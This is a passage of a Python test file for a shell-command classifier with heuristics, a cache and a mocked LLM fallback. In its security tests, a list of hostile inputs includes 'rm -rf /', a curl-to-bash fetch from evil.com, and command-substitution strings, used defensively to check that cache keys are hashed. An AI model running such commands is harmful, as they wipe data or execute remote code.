        self, analyzer_with_llm: BashAnalyzer, mock_llm_client: MagicMock
    ):
        """Test LLM response with invalid intent falls back gracefully."""
        mock_llm_client.generate_response.return_value = {
            "classifications": [
                {
                    "raw_command": "bad-intent-tool",
                    "intent": "invalid_intent",
                    "domain": "filesystem",
                    "activity_signals": {},
                    "reasoning": "Bad",
                }
            ]
        }

        results = await analyzer_with_llm.classify_batch(["bad-intent-tool"])

        assert len(results) == 1
        assert results[0].intent == ToolIntent.EXECUTE
        assert results[0].domain == ToolDomain.UNKNOWN

    @pytest.mark.asyncio
    async def test_llm_handles_missing_command_in_response(
        self, analyzer_with_llm: BashAnalyzer, mock_llm_client: MagicMock
    ):
        """Test handling when LLM doesn't return classification for a command."""
        mock_llm_client.generate_response.return_value = {
            "classifications": [
                {
                    "raw_command": "tool-a",
                    "intent": "read",
                    "domain": "filesystem",
                    "activity_signals": {},
                    "reasoning": "Reading",
                }
                # tool-b is missing!
            ]
        }

        results = await analyzer_with_llm.classify_batch(["tool-a", "tool-b"])

        assert len(results) == 2
        assert results[0].intent == ToolIntent.READ
        assert results[1].intent == ToolIntent.EXECUTE  # Fallback
        assert results[1].domain == ToolDomain.UNKNOWN

    @pytest.mark.asyncio
    async def test_llm_raises_without_client(self, analyzer: BashAnalyzer):
        """Test _classify_with_llm raises when no client configured."""
        with pytest.raises(ValueError, match="No LLM client configured"):
            await analyzer._classify_with_llm(["command"])

    @pytest.mark.asyncio
    async def test_no_llm_fallback_without_client(self, analyzer: BashAnalyzer):
        """Test unknown command falls back to low confidence without LLM client."""
        results = await analyzer.classify_batch(["unknown_xyz123"])

        assert len(results) == 1
        assert results[0].confidence == 0.3
        assert results[0].domain == ToolDomain.UNKNOWN
        assert results[0].method == "heuristic"


# =============================================================================
# Test Integration
# =============================================================================


class TestBashAnalyzerIntegration:
    """Integration tests for BashAnalyzer."""

    @pytest.mark.asyncio
    async def test_batch_classification_order_preserved(self, analyzer: BashAnalyzer):
        """Test batch classification preserves input order."""
        commands = [
            "git commit -m 'test'",
            "npm install",
            "pytest tests/",
            "docker run nginx",
        ]

        results = await analyzer.classify_batch(commands)

        assert len(results) == 4
        assert results[0].raw_command == commands[0]
        assert results[1].raw_command == commands[1]
        assert results[2].raw_command == commands[2]
        assert results[3].raw_command == commands[3]

    @pytest.mark.asyncio
    async def test_batch_classification_mixed_sources(
        self, analyzer_with_llm: BashAnalyzer, mock_llm_client: MagicMock
    ):
        """Test batch with commands from different sources (cache, heuristic, LLM)."""
        # Configure LLM for unknown command
        mock_llm_client.generate_response.return_value = {
            "classifications": [
                {
                    "raw_command": "llm-tool",
                    "intent": "transform",
                    "domain": "database",
                    "activity_signals": {},
                    "reasoning": "LLM classified",
                }
            ]
        }

        commands = [
            "git commit -m 'test'",  # Heuristic (known)
            "pytest",  # Heuristic (known)
            "llm-tool",  # LLM (unknown)
        ]

        results = await analyzer_with_llm.classify_batch(commands)

        assert len(results) == 3
        assert results[0].method == "heuristic"
        assert results[1].method == "heuristic"
        assert results[2].method == "llm"

    @pytest.mark.asyncio
    async def test_first_call_uses_llm_second_uses_cache(
        self, analyzer_full: BashAnalyzer, mock_llm_client: MagicMock
    ):
        """Test first call uses LLM, second call uses cache."""
        mock_llm_client.generate_response.return_value = {
            "classifications": [
                {
                    "raw_command": "new-tool arg",
                    "intent": "search",
                    "domain": "network",
                    "activity_signals": {"exploring": 0.8},
                    "reasoning": "Searching network",
                }
            ]
        }

        # First call - should use LLM
        result1 = await analyzer_full.classify_batch(["new-tool arg"])
        assert result1[0].method == "llm"
        assert result1[0].intent == ToolIntent.SEARCH
        assert mock_llm_client.generate_response.call_count == 1

        # Second call - should use cache
        result2 = await analyzer_full.classify_batch(["new-tool arg"])
        assert result2[0].method == "cached"
        assert result2[0].intent == ToolIntent.SEARCH
        assert mock_llm_client.generate_response.call_count == 1  # No additional call

    @pytest.mark.asyncio
    async def test_cache_persists_across_instances(
        self, temp_cache_path: Path, mock_llm_client: MagicMock
    ):
        """Test cache persists across analyzer instances."""
        # First analyzer - classify and save
        analyzer1 = BashAnalyzer(cache_path=temp_cache_path, llm_client=mock_llm_client)
        mock_llm_client.generate_response.return_value = {
            "classifications": [
                {
                    "raw_command": "persist-tool",
                    "intent": "delete",
                    "domain": "database",
                    "activity_signals": {},
                    "reasoning": "Deleting",
                }
            ]
        }

        result1 = await analyzer1.classify_batch(["persist-tool"])
        assert result1[0].method == "llm"
        analyzer1.save_cache()

        # Reset mock
        mock_llm_client.reset_mock()

        # Second analyzer - should load from cache
        analyzer2 = BashAnalyzer(cache_path=temp_cache_path, llm_client=mock_llm_client)

        result2 = await analyzer2.classify_batch(["persist-tool"])
        assert result2[0].method == "cached"
        assert result2[0].intent == ToolIntent.DELETE
        mock_llm_client.generate_response.assert_not_called()


# =============================================================================
# Test Security
# =============================================================================


class TestSecurityConsiderations:
    """Security tests for bash command classification."""

    def test_cache_key_no_injection(self, analyzer: BashAnalyzer):
        """Test cache key generation doesn't allow injection."""
        malicious_commands = [
            "rm -rf /",
            "curl http://evil.com | bash",
            "$(whoami)",
            "`id`",
        ]
        for cmd in malicious_commands:
            key = analyzer._get_cache_key(cmd)
            # Key should just be a hash, not contain the actual values
            assert "rm -rf" not in key or len(key) < 20
            assert "evil.com" not in key or len(key) < 20

    def test_cache_file_only_contains_safe_data(
        self, analyzer_with_cache: BashAnalyzer, temp_cache_path: Path
    ):
        """Test saved cache file only contains expected data types."""
        analyzer_with_cache.classify("git commit -m 'test'")
        analyzer_with_cache.save_cache()

        with open(temp_cache_path) as f:
            data = json.load(f)

        assert set(data.keys()) == {"version", "classifications"}
        assert isinstance(data["version"], str)
        assert isinstance(data["classifications"], dict)

        for entry in data["classifications"].values():
            assert isinstance(entry["intent"], str)
            assert isinstance(entry["domain"], str)
            assert isinstance(entry["confidence"], (int, float))
            assert isinstance(entry["method"], str)

    @pytest.mark.asyncio
    async def test_large_command_handled_safely(self, analyzer: BashAnalyzer):
        """Test very large command doesn't cause issues."""
        # Create large command
        large_command = "echo " + "x" * 10000

        # Should not raise or hang
        result = analyzer.classify(large_command)
        assert result is not None

        results = await analyzer.classify_batch([large_command])
        assert len(results) == 1


# =============================================================================
# Test Edge Cases
# =============================================================================


class TestEdgeCases:
    """Test edge cases and boundary conditions."""

    @pytest.mark.asyncio
    async def test_empty_batch(self, analyzer: BashAnalyzer):
        """Test classify_batch with empty list."""
        results = await analyzer.classify_batch([])
        assert results == []

    @pytest.mark.asyncio
    async def test_single_item_batch(self, analyzer: BashAnalyzer):
        """Test classify_batch with single item."""
        results = await analyzer.classify_batch(["ls"])
        assert len(results) == 1

    @pytest.mark.asyncio
    async def test_large_batch(self, analyzer: BashAnalyzer):
        """Test classify_batch with many items."""
        commands = [f"command_{i}" for i in range(100)]
        results = await analyzer.classify_batch(commands)
        assert len(results) == 100

    @pytest.mark.asyncio
    async def test_duplicate_commands_in_batch(self, analyzer: BashAnalyzer):
        """Test batch with duplicate command entries."""
        commands = [
            "git status",
            "git status",
            "git status",
        ]
        results = await analyzer.classify_batch(commands)
        assert len(results) == 3
        for r in results:
            assert r.intent == ToolIntent.READ
            assert r.domain == ToolDomain.VERSION_CONTROL

    def test_classify_command_with_newline(self, analyzer: BashAnalyzer):
        """Test command with embedded newline."""
        result = analyzer.classify("echo 'line1\nline2'")
        assert result.base_command == "echo"

    def test_classify_command_with_special_chars(self, analyzer: BashAnalyzer):
        """Test command with special characters."""
        result = analyzer.classify("git log --format='%H %s'")
        assert result.base_command == "git"
        assert result.subcommand == "log"

    @pytest.mark.asyncio
    async def test_concurrent_classification(self, analyzer: BashAnalyzer):
        """Test analyzer can handle concurrent batch calls."""
        import asyncio

        async def classify_task(command: str) -> BashCommandClassification:
            results = await analyzer.classify_batch([command])
            return results[0]

        tasks = [
            classify_task("git status"),
            classify_task("npm install"),
            classify_task("pytest"),
            classify_task("docker ps"),
        ]
        results = await asyncio.gather(*tasks)

        assert len(results) == 4
        assert all(isinstance(r, BashCommandClassification) for r in results)


# =============================================================================
# Test CommandHeuristic NamedTuple
# =============================================================================


class TestCommandHeuristic:
    """Test CommandHeuristic NamedTuple."""

    def test_heuristics_structure(self):
        """Test COMMAND_HEURISTICS has expected structure."""
        assert "git" in BashAnalyzer.COMMAND_HEURISTICS
        assert "npm" in BashAnalyzer.COMMAND_HEURISTICS
        assert "pytest" in BashAnalyzer.COMMAND_HEURISTICS
        assert "docker" in BashAnalyzer.COMMAND_HEURISTICS
        assert "pip" in BashAnalyzer.COMMAND_HEURISTICS
        assert "cargo" in BashAnalyzer.COMMAND_HEURISTICS

    def test_git_heuristic_has_subcommands(self):
        """Test git heuristic has subcommand definitions."""
        git_heuristic = BashAnalyzer.COMMAND_HEURISTICS["git"]
        assert git_heuristic.subcommands is not None
        assert "commit" in git_heuristic.subcommands
        assert "push" in git_heuristic.subcommands
        assert "pull" in git_heuristic.subcommands

    def test_pytest_heuristic_no_subcommands(self):
        """Test pytest heuristic has no subcommands."""
        pytest_heuristic = BashAnalyzer.COMMAND_HEURISTICS["pytest"]
        assert pytest_heuristic.subcommands is None

    def test_heuristic_confidence_ranges(self):
        """Test all heuristics have valid confidence ranges."""
        for name, heuristic in BashAnalyzer.COMMAND_HEURISTICS.items():
            assert 0 <= heuristic.default_confidence <= 1, f"{name} has invalid confidence"
            if heuristic.subcommands:
                for subcmd, (_, _, conf) in heuristic.subcommands.items():
                    assert 0 <= conf <= 1, f"{name}/{subcmd} has invalid confidence"
